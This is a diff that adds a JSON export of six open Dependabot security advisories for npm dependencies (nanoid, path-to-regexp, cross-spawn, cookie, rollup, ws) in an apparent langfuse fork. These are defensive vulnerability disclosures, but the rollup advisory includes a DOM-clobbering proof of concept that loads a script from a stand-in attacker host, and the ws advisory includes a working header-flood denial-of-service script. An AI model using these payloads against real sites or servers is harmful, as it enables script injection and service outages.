@@ -1,0 +1,721 @@
+[
+    {
+        "number": 6,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "npm",
+                "name": "nanoid"
+            },
+            "manifest_path": "pnpm-lock.yaml",
+            "scope": "runtime"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-mwcw-c2x4-8c55",
+            "cve_id": "CVE-2024-55565",
+            "summary": "Predictable results in nanoid generation when given non-integer values",
+            "description": "When nanoid is called with a fractional value, there were a number of undesirable effects:\n\n1. in browser and non-secure, the code infinite loops on while (size--)\n2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled\n3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error\n\nVersion 3.3.8 and 5.0.9 are fixed.",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-mwcw-c2x4-8c55",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2024-55565",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-55565"
+                },
+                {
+                    "url": "https://github.com/ai/nanoid/pull/510"
+                },
+                {
+                    "url": "https://github.com/ai/nanoid/compare/3.3.7...3.3.8"
+                },
+                {
+                    "url": "https://github.com/ai/nanoid/releases/tag/5.0.9"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-mwcw-c2x4-8c55"
+                }
+            ],
+            "published_at": "2024-12-09T03:30:59Z",
+            "updated_at": "2024-12-13T22:57:32Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "npm",
+                        "name": "nanoid"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": ">= 4.0.0, < 5.0.9",
+                    "first_patched_version": {
+                        "identifier": "5.0.9"
+                    }
+                },
+                {
+                    "package": {
+                        "ecosystem": "npm",
+                        "name": "nanoid"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "< 3.3.8",
+                    "first_patched_version": {
+                        "identifier": "3.3.8"
+                    }
+                }
+            ],
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+                "score": 4.3
+            },
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+                    "score": 4.3
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-835",
+                    "name": "Loop with Unreachable Exit Condition ('Infinite Loop')"
+                }
+            ]
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "npm",
+                "name": "nanoid"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "< 3.3.8",
+            "first_patched_version": {
+                "identifier": "3.3.8"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/langfuse/dependabot/alerts/6",
+        "html_url": "https://github.com/fcas/langfuse/security/dependabot/6",
+        "created_at": "2024-12-28T23:11:02Z",
+        "updated_at": "2024-12-28T23:11:02Z",
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 5,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "npm",
+                "name": "path-to-regexp"
+            },
+            "manifest_path": "pnpm-lock.yaml",
+            "scope": "runtime"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-rhx6-c78j-4q9w",
+            "cve_id": "CVE-2024-52798",
+            "summary": "Unpatched `path-to-regexp` ReDoS in 0.1.x",
+            "description": "### Impact\n\nThe regular expression that is vulnerable to backtracking can be generated in the 0.1.x release of `path-to-regexp`, originally reported in CVE-2024-45296\n\n### Patches\n\nUpgrade to 0.1.12.\n\n### Workarounds\n\nAvoid using two parameters within a single path segment, when the separator is not `.` (e.g. no `/:a-:b`). Alternatively, you can define the regex used for both parameters and ensure they do not overlap to allow backtracking.\n\n### References\n\n- https://github.com/advisories/GHSA-9wv6-86v2-598j\n- https://blakeembrey.com/posts/2024-09-web-redos/",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-rhx6-c78j-4q9w",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2024-52798",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-rhx6-c78j-4q9w"
+                },
+                {
+                    "url": "https://blakeembrey.com/posts/2024-09-web-redos"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-52798"
+                },
+                {
+                    "url": "https://github.com/pillarjs/path-to-regexp/commit/f01c26a013b1889f0c217c643964513acf17f6a4"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-rhx6-c78j-4q9w"
+                }
+            ],
+            "published_at": "2024-12-05T22:40:47Z",
+            "updated_at": "2024-12-06T00:33:29Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "npm",
+                        "name": "path-to-regexp"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "< 0.1.12",
+                    "first_patched_version": {
+                        "identifier": "0.1.12"
+                    }
+                }
+            ],
+            "cvss": {
+                "vector_string": null,
+                "score": 0.0
+            },
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": null,
+                    "score": 0.0
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-1333",
+                    "name": "Inefficient Regular Expression Complexity"
+                }
+            ]
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "npm",
+                "name": "path-to-regexp"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "< 0.1.12",
+            "first_patched_version": {
+                "identifier": "0.1.12"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/langfuse/dependabot/alerts/5",
+        "html_url": "https://github.com/fcas/langfuse/security/dependabot/5",
+        "created_at": "2024-12-28T23:11:02Z",
+        "updated_at": "2024-12-28T23:11:02Z",
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 4,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "npm",
+                "name": "cross-spawn"
+            },
+            "manifest_path": "pnpm-lock.yaml",
+            "scope": "runtime"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-3xgq-45jj-v275",
+            "cve_id": "CVE-2024-21538",
+            "summary": "Regular Expression Denial of Service (ReDoS) in cross-spawn",
+            "description": "Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-3xgq-45jj-v275",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2024-21538",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-21538"
+                },
+                {
+                    "url": "https://github.com/moxystudio/node-cross-spawn/pull/160"
+                },
+                {
+                    "url": "https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff"
+                },
+                {
+                    "url": "https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f"
+                },
+                {
+                    "url": "https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230"
+                },
+                {
+                    "url": "https://github.com/moxystudio/node-cross-spawn/issues/165"
+                },
+                {
+                    "url": "https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd"
+                },
+                {
+                    "url": "https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-3xgq-45jj-v275"
+                }
+            ],
+            "published_at": "2024-11-08T06:30:47Z",
+            "updated_at": "2024-11-19T16:19:50Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "npm",
+                        "name": "cross-spawn"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": ">= 7.0.0, < 7.0.5",
+                    "first_patched_version": {
+                        "identifier": "7.0.5"
+                    }
+                },
+                {
+                    "package": {
+                        "ecosystem": "npm",
+                        "name": "cross-spawn"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 6.0.6",
+                    "first_patched_version": {
+                        "identifier": "6.0.6"
+                    }
+                }
+            ],
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "score": 7.5
+            },
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                    "score": 7.5
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-1333",
+                    "name": "Inefficient Regular Expression Complexity"
+                }
+            ]
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "npm",
+                "name": "cross-spawn"
+            },
+            "severity": "high",
+            "vulnerable_version_range": ">= 7.0.0, < 7.0.5",
+            "first_patched_version": {
+                "identifier": "7.0.5"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/langfuse/dependabot/alerts/4",
+        "html_url": "https://github.com/fcas/langfuse/security/dependabot/4",
+        "created_at": "2024-12-28T23:11:02Z",
+        "updated_at": "2024-12-28T23:11:02Z",
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 3,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "npm",
+                "name": "cookie"
+            },
+            "manifest_path": "pnpm-lock.yaml",
+            "scope": "runtime"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-pxg6-pf52-xh8x",
+            "cve_id": "CVE-2024-47764",
+            "summary": "cookie accepts cookie name, path, and domain with out of bounds characters",
+            "description": "### Impact\n\nThe cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a\", value)` would result in `\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test\"`, setting `userName` cookie to `<script>` and ignoring `value`.\n\nA similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.\n\n### Patches\n\nUpgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.\n\n### Workarounds\n\nAvoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.\n\n### References\n\n* https://github.com/jshttp/cookie/pull/167",
+            "severity": "low",
+            "identifiers": [
+                {
+                    "value": "GHSA-pxg6-pf52-xh8x",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2024-47764",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/jshttp/cookie/security/advisories/GHSA-pxg6-pf52-xh8x"
+                },
+                {
+                    "url": "https://github.com/jshttp/cookie/pull/167"
+                },
+                {
+                    "url": "https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-pxg6-pf52-xh8x"
+                }
+            ],
+            "published_at": "2024-10-04T20:31:00Z",
+            "updated_at": "2024-10-04T20:31:01Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "npm",
+                        "name": "cookie"
+                    },
+                    "severity": "low",
+                    "vulnerable_version_range": "< 0.7.0",
+                    "first_patched_version": {
+                        "identifier": "0.7.0"
+                    }
+                }
+            ],
+            "cvss": {
+                "vector_string": null,
+                "score": 0.0
+            },
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": null,
+                    "score": 0.0
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-74",
+                    "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')"
+                }
+            ]
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "npm",
+                "name": "cookie"
+            },
+            "severity": "low",
+            "vulnerable_version_range": "< 0.7.0",
+            "first_patched_version": {
+                "identifier": "0.7.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/langfuse/dependabot/alerts/3",
+        "html_url": "https://github.com/fcas/langfuse/security/dependabot/3",
+        "created_at": "2024-12-28T23:11:02Z",
+        "updated_at": "2024-12-28T23:11:02Z",
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 2,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "npm",
+                "name": "rollup"
+            },
+            "manifest_path": "pnpm-lock.yaml",
+            "scope": "runtime"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-gcx4-mw62-g8wm",
+            "cve_id": "CVE-2024-47068",
+            "summary": "DOM Clobbering Gadget found in rollup bundled scripts that leads to XSS",
+            "description": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use `import.meta.url` or with plugins that emit and reference asset files from code  in `cjs`/`umd`/`iife` format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.\n\nIt's worth noting that we’ve identifed similar issues in other popular bundlers like Webpack ([CVE-2024-43788](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986)), which might serve as a good reference.\n\n### Details\n\n#### Backgrounds\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n#### Gadget found in `rollup`\n\nWe have identified a DOM Clobbering vulnerability in `rollup` bundled scripts, particularly when the scripts uses `import.meta` and set output in format of  `cjs`/`umd`/`iife`. In such cases, `rollup` replaces meta property with the URL retrieved from `document.currentScript`.\n\nhttps://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162\n\nhttps://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185\n\nHowever, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the `src` attribute of the attacker-controlled element (e.g., an `img` tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.\n\n### PoC\n\nConsidering a website that contains the following `main.js` script, the devloper decides to use the `rollup` to bundle up the program: `rollup main.js --format cjs --file bundle.js`.\n\n```\nvar s = document.createElement('script')\ns.src = import.meta.url + 'extra.js'\ndocument.head.append(s)\n```\n\nThe output `bundle.js` is shown in the following code snippet.\n\n```\n'use strict';\n\nvar _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;\nvar s = document.createElement('script');\ns.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript && False && _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';\ndocument.head.append(s);\n```\n\nAdding the `rollup` bundled script, `bundle.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server` due to the introduced gadget during bundling. The attacker only needs to insert an `img` tag with the name attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>rollup Example</title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\" src=\"https://attacker.controlled.server/\"></img>\n  <!-- Attacker-controlled Script-less HTML Element ends--!>\n</head>\n<script type=\"module\" crossorigin src=\"bundle.js\"></script>\n<body>\n</body>\n</html>\n```\n\n### Impact\n\nThis vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of `cjs`, `iife`, or `umd` and use `import.meta`) and allow users to inject certain scriptless HTML tags without properly sanitizing the `name` or `id` attributes.\n\n### Patch\n\nPatching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.\n\n```\nconst getRelativeUrlFromDocument = (relativePath: string, umd = false) =>\n\tgetResolveUrl(\n\t\t`'${escapeId(relativePath)}', ${\n\t\t\tumd ? `typeof document === 'undefined' ? location.href : ` : ''\n\t\t}document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`\n\t);\n```\n\n```\nconst getUrlFromDocument = (chunkId: string, umd = false) =>\n\t`${\n\t\tumd ? `typeof document === 'undefined' ? location.href : ` : ''\n\t}(${DOCUMENT_CURRENT_SCRIPT} && ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' &&${DOCUMENT_CURRENT_SCRIPT}.src || new URL('${escapeId(\n\t\tchunkId\n\t)}', document.baseURI).href)`;\n```\n",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-gcx4-mw62-g8wm",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2024-47068",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47068"
+                },
+                {
+                    "url": "https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4"
+                },
+                {
+                    "url": "https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541"
+                },
+                {
+                    "url": "https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162"
+                },
+                {
+                    "url": "https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-gcx4-mw62-g8wm"
+                }
+            ],
+            "published_at": "2024-09-23T22:11:02Z",
+            "updated_at": "2024-09-26T21:11:54Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "npm",
+                        "name": "rollup"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": ">= 4.0.0, < 4.22.4",
+                    "first_patched_version": {
+                        "identifier": "4.22.4"
+                    }
+                },
+                {
+                    "package": {
+                        "ecosystem": "npm",
+                        "name": "rollup"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": ">= 3.0.0, < 3.29.5",
+                    "first_patched_version": {
+                        "identifier": "3.29.5"
+                    }
+                },
+                {
+                    "package": {
+                        "ecosystem": "npm",
+                        "name": "rollup"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 2.79.2",
+                    "first_patched_version": {
+                        "identifier": "2.79.2"
+                    }
+                }
+            ],
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H",
+                "score": 6.4
+            },
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H",
+                    "score": 6.4
+                },
+                "cvss_v4": {
+                    "vector_string": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:L/VA:H/SC:N/SI:N/SA:N",
+                    "score": 8.3
+                }
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-79",
+                    "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+                }
+            ]
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "npm",
+                "name": "rollup"
+            },
+            "severity": "high",
+            "vulnerable_version_range": ">= 4.0.0, < 4.22.4",
+            "first_patched_version": {
+                "identifier": "4.22.4"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/langfuse/dependabot/alerts/2",
+        "html_url": "https://github.com/fcas/langfuse/security/dependabot/2",
+        "created_at": "2024-12-28T23:11:02Z",
+        "updated_at": "2024-12-28T23:11:02Z",
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 1,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "npm",
+                "name": "ws"
+            },
+            "manifest_path": "pnpm-lock.yaml",
+            "scope": "runtime"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-3h5v-q93c-6h6q",
+            "cve_id": "CVE-2024-37890",
+            "summary": "ws affected by a DoS when handling a request with many HTTP headers",
+            "description": "### Impact\n\nA request with a number of headers exceeding the[`server.maxHeadersCount`][] threshold could be used to crash a ws server.\n\n### Proof of concept\n\n```js\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 0 }, function () {\n  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');\n  const headers = {};\n  let count = 0;\n\n  for (let i = 0; i < chars.length; i++) {\n    if (count === 2000) break;\n\n    for (let j = 0; j < chars.length; j++) {\n      const key = chars[i] + chars[j];\n      headers[key] = 'x';\n\n      if (++count === 2000) break;\n    }\n  }\n\n  headers.Connection = 'Upgrade';\n  headers.Upgrade = 'websocket';\n  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';\n  headers['Sec-WebSocket-Version'] = '13';\n\n  const request = http.request({\n    headers: headers,\n    host: '127.0.0.1',\n    port: wss.address().port\n  });\n\n  request.end();\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)\n\n### Workarounds\n\nIn vulnerable versions of ws, the issue can be mitigated in the following ways:\n\n1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.\n2. Set `server.maxHeadersCount` to `0` so that no limit is applied.\n\n### Credits\n\nThe vulnerability was reported by [Ryan LaPointe](https://github.com/rrlapointe) in https://github.com/websockets/ws/issues/2230.\n\n### References\n\n- https://github.com/websockets/ws/issues/2230\n- https://github.com/websockets/ws/pull/2231\n\n[`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize\n[`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener\n[`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount\n",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-3h5v-q93c-6h6q",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2024-37890",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q"
+                },
+                {
+                    "url": "https://github.com/websockets/ws/issues/2230"
+                },
+                {
+                    "url": "https://github.com/websockets/ws/pull/2231"
+                },
+                {
+                    "url": "https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f"
+                },
+                {
+                    "url": "https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e"
+                },
+                {
+                    "url": "https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c"
+                },
+                {
+                    "url": "https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-3h5v-q93c-6h6q"
+                }
+            ],
+            "published_at": "2024-06-17T19:09:10Z",
+            "updated_at": "2024-08-05T05:02:34Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "npm",
+                        "name": "ws"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": ">= 2.1.0, < 5.2.4",
+                    "first_patched_version": {
+                        "identifier": "5.2.4"
+                    }
+                },
+                {
+                    "package": {
+                        "ecosystem": "npm",
+                        "name": "ws"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": ">= 6.0.0, < 6.2.3",
+                    "first_patched_version": {
+                        "identifier": "6.2.3"
+                    }
+                },
+                {
+                    "package": {
+                        "ecosystem": "npm",
+                        "name": "ws"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": ">= 7.0.0, < 7.5.10",
+                    "first_patched_version": {
+                        "identifier": "7.5.10"
+                    }
+                },
+                {
+                    "package": {
+                        "ecosystem": "npm",
+                        "name": "ws"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": ">= 8.0.0, < 8.17.1",
+                    "first_patched_version": {
+                        "identifier": "8.17.1"
+                    }
+                }
+            ],
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "score": 7.5
+            },
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                    "score": 7.5
+                },
+                "cvss_v4": {
+                    "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+                    "score": 8.7
+                }
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-476",
+                    "name": "NULL Pointer Dereference"
+                }
+            ]
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "npm",
+                "name": "ws"
+            },
+            "severity": "high",
+            "vulnerable_version_range": ">= 8.0.0, < 8.17.1",
+            "first_patched_version": {
+                "identifier": "8.17.1"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/langfuse/dependabot/alerts/1",
+        "html_url": "https://github.com/fcas/langfuse/security/dependabot/1",
+        "created_at": "2024-12-28T23:11:02Z",
+        "updated_at": "2024-12-28T23:11:02Z",
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    }
+]
